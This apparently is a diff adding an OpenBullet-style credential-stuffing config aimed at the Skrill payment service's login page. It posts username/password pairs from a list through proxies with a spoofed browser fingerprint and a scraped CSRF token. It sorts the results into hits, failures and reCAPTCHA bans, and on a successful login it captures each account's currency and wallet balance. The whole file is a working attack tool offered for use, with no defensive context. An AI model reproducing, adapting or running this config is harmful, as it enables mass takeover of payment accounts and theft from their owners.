@@ -1,0 +1,75 @@
+[SETTINGS]
+{
+  "Name": "account.skrill.com/login",
+  "SuggestedBots": 20,
+  "LastModified": "2019-01-11T08:25:46.3517703+01:00",
+  "AdditionalInfo": "",
+  "Author": "",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST GET "https://account.skrill.com/login" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9,fa;q=0.8" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Ban OR 
+    KEY "<HEADERS(*)>" Contains "<html></html>" 
+#Token PARSE "<SOURCE>" LR "csrf-token\" content=\"" "\" />" Recursive=FALSE -> VAR "TOKEN" "" "" 
+#REQUEST_2 REQUEST POST "https://account.skrill.com/login" AutoRedirect=TRUE 
+  CONTENT "utf8=%E2%9C%93&authenticity_token=<TOKEN>&user_authentication%5Bemail%5D=<USER>&user_authentication%5Bpassword%5D=<PASS>&user_authentication%5Bbrowser_fingerprint%5D=TF1%3B014%3B%3B%3B%3B%3B%3B%3B%3B%3B%3B%3B%3B%3B%3B%3B%3B%3B%3B%3B%3B%3B%3BMozilla%3BNetscape%3B5.0%2520%2528Windows%2520NT%252010.0%253B%2520Win64%253B%2520x64%2529%2520AppleWebKit%2F537.36%2520%2528KHTML%252C%2520like%2520Gecko%2529%2520Chrome%2F71.0.3578.98%2520Safari%2F537.36%3B20030107%3Bundefined%3Btrue%3B%3Btrue%3BWin32%3Bundefined%3BMozilla%2F5.0%2520%2528Windows%2520NT%252010.0%253B%2520WOW64%2529%2520AppleWebKit%2F537.36%2520%2528KHTML%252C%2520like%2520Gecko%2529%2520Chrome%2F62.0.3202.9%2520Safari%2F537.36%3Ben-US%3Bundefined%3Baccount.skrill.com%3Bundefined%3Bundefined%3Bundefined%3Bundefined%3Btrue%3Bfalse%3B1547141362697%3B-8%3B6%2F7%2F2005%252C%25209%253A33%253A44%2520PM%3B1366%3B768%3B%3B%3B%3B%3B%3B%3B12%3B480%3B420%3B1%2F10%2F2019%252C%25209%253A29%253A22%2520AM%3B24%3B&user_authentication%5Bsecurity_token%5D=&user_authentication%5Bpair_device%5D=0&user_authentication%5Bselected_challenge_hint%5D=&user_authentication%5Bselected_challenge_option_type%5D=&user_authentication%5Bselected_challenge_answer%5D=&user_authentication%5Bprepaid_cards_challenge_answer%5D=&user_authentication%5Bcredit_cards_challenge_answer%5D=&user_authentication%5Bcredit_cards_full_challenge_answer%5D=&user_authentication%5Bbank_accounts_challenge_answer%5D=&user_authentication%5Binstrument_number%5D=&user_authentication%5Bsms_verify_challenge_answer%5D=&user_authentication%5Bpin_challenge_answer%5D=&g-recaptcha-response=&user_authentication%5Bpromo_campaign_id%5D=" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Origin: https://account.skrill.com" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "Referer: https://account.skrill.com/login" 
+  HEADER "X-CSRF-Token: <TOKEN>" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9,fa;q=0.8" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "Invalid credentials" 
+    KEY "Email required" 
+  KEYCHAIN Success OR 
+    KEY "success\":true" 
+  KEYCHAIN Ban OR 
+    KEY "recaptcha.errors.verification_failed" 
+#Cs PARSE "<COOKIES(XSRF-TOKEN)>" LR "" "" Recursive=FALSE -> VAR "CS" "" "" 
+#REQUEST_3 REQUEST GET "https://account.skrill.com/api/wallet/preflight" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/json, text/plain, */*" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Origin: https://account.skrill.com" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "Referer: https://account.skrill.com/login" 
+  HEADER "X-XSRF-TOKEN: <CS>" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9,fa;q=0.8" 
+#currency PARSE "<SOURCE>" LR "currency\":\"" "\"" Recursive=FALSE -> CAP "currency" "" "" 
+#displayBalance PARSE "<SOURCE>" LR "displayBalance\":" "," Recursive=FALSE -> CAP "displayBalance" "" "" 
+#displayAvailableBalance PARSE "<SOURCE>" LR "displayAvailableBalance\":" "," Recursive=FALSE -> CAP "displayAvailableBalance" "" "" 
